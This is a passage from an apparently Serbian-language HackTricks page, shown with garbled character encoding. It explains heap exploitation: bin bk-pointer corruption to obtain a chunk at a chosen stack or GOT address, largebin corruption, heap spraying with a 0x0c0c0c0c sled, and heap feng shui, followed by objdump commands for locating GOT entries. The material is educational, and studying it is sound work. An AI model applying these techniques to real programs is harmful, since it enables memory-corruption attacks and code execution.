Potrebno je rezervisati dva malloc-a, tako da prvi mo≈æe biti preplavljen nakon ≈°to je drugi osloboƒëen i ubaƒçen u svoj bin (tj. kada je rezervisan malloc veƒái od drugog dela pre nego ≈°to se preplavi).

Malloc koji je rezervisan i ƒçija adresa je odabrana od strane napadaƒça mora biti pod kontrolom napadaƒça.

Cilj je sledeƒái: ako mo≈æemo preplaviti heap koji ima osloboƒëen deo ispod sebe i nalazi se u svom bin-u, mo≈æemo promeniti njegov bk pokazivaƒç. Ako promenimo bk pokazivaƒç i taj deo postane prvi na listi bin-a i rezervi≈°e se, bin ƒáe biti prevaren i reƒái ƒáe mu se da je poslednji deo liste (sledeƒái koji se nudi) na la≈ænoj adresi koju smo postavili (na stack ili GOT na primer). Dakle, ako se rezervi≈°e jo≈° jedan deo i napadaƒç ima dozvole na njemu, dobiƒáe deo na ≈æeljenoj poziciji i moƒái ƒáe da pi≈°e u njega.

Nakon ≈°to je promenjen deo osloboƒëenog dela, potrebno je rezervisati deo koji je veƒái od osloboƒëenog, tako da promenjeni deo izaƒëe iz unsorted bin-a i ubaci se u svoj bin.

Kada se nalazi u svom bin-u, vreme je da se promeni bk pokazivaƒç preko preplavljenosti kako bi pokazivao na adresu koju ≈æelimo da prepi≈°emo.

Dakle, bin mora da ƒçeka da se dovoljno puta pozove malloc() kako bi se ponovo koristio promenjeni bin i prevario bin tako ≈°to ƒáe mu se reƒái da je sledeƒái deo na la≈ænoj adresi. A zatim ƒáe biti dat deo koji nam je potreban.

Da bi se izvr≈°ila ranjivost ≈°to je pre moguƒáe, idealno bi bilo: rezervacija ranjivog dela, rezervacija dela koji ƒáe biti promenjen, osloboƒëenje tog dela, rezervacija dela koji je veƒái od dela koji ƒáe biti promenjen, promena dela (ranjivost), rezervacija dela iste veliƒçine kao ranjivi deo i rezervacija drugog dela iste veliƒçine koji ƒáe pokazivati na odabranu adresu.

Da bi se za≈°titio od ovog napada, koristi se tipiƒçna provera da deo "nije" la≈æan: proverava se da li bck->fd pokazuje na ≈ærtvu. Drugim reƒçima, u na≈°em sluƒçaju, ako pokazivaƒç fd* la≈ænog dela na stack-u pokazuje na ≈ærtvu. Da bi se prevazi≈°la ova za≈°tita, napadaƒç mora biti sposoban da na neki naƒçin (verovatno preko stack-a) upi≈°e odgovarajuƒáu adresu ≈ærtve na odgovarajuƒáu adresu. Tako ƒáe izgledati kao pravi deo.

### Korupcija LargeBin-a

Potrebni su isti uslovi kao i pre, ali i neki dodatni, osim toga, rezervisani delovi moraju biti veƒái od 512.

Napad je isti kao i prethodni, tj. potrebno je promeniti bk pokazivaƒç i potrebni su svi ti pozivi malloc(), ali takoƒëe je potrebno promeniti veliƒçinu promenjenog dela tako da ta veliƒçina - nb bude < MINSIZE.

Na primer, postaviƒáemo veliƒçinu na 1552 kako bi 1552 - 1544 = 8 < MINSIZE (oduzimanje ne sme biti negativno jer se uporeƒëuje sa unsigned vredno≈°ƒáu).

Takoƒëe je uveden zakrpa da bi to bilo jo≈° te≈æe.

### Heap Spraying

Osnovna ideja je rezervisati ≈°to vi≈°e memorije za heap-ove i popuniti ih jastukom od nops-a koji se zavr≈°ava shellcode-om. Osim toga, kao jastuk se koristi 0x0c. Poku≈°aƒáemo da skoƒçimo na adresu 0x0c0c0c0c, tako da ako se neka adresa preplavi sa ovim jastukom i pozove se, skoƒçiƒáe tamo. Osnovna taktika je rezervisati ≈°to je vi≈°e moguƒáe da bismo videli da li se neki pokazivaƒç preplavljuje i skoƒçiti na 0x0c0c0c0c u nadi da ƒáe tamo biti nops.

### Heap Feng Shui

Sastoji se od rezervacija i osloboƒëenja memorije na naƒçin da se delovi memorije rezervi≈°u izmeƒëu osloboƒëenih delova. Buffer koji ƒáe biti preplavljen ƒáe biti sme≈°ten u jednom od tih delova.

### objdump -d izvr≈°ni_fajl ‚Äî> Disas funkcije
### objdump -d ./PROGRAM | grep FUNKCIJA ‚Äî> Dobijanje adrese funkcije
### objdump -d -Mintel ./shellcodeout ‚Äî> Da biste videli da li je to zaista na≈° shellcode i izvukli OpCodes
### objdump -t ./exec | grep varBss ‚Äî> Tabela simbola, da biste dobili adresu promenljive i funkcije
### objdump -TR ./exec | grep exit(func lib) ‚Äî> Da biste dobili adresu funkcija biblioteka (GOT)
### objdump -d ./exec | grep funcCode
### objdump -s -j .dtors /exec
### objdump -s -j .got ./exec
### objdump -t --dynamic-relo ./exec | grep puts ‚Äî> Izvlaƒçi adresu puts-a koju treba prebrisati u GOT-u
### objdump -D ./exec ‚Äî> Disas sve do ulaza u plt
### objdump -p -/exec
### Info functions strncmp ‚Äî> Info o funkciji u gdb

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini da podr≈æite HackTricks:

* Ako ≈æelite da vidite **va≈°u kompaniju ogla≈°enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
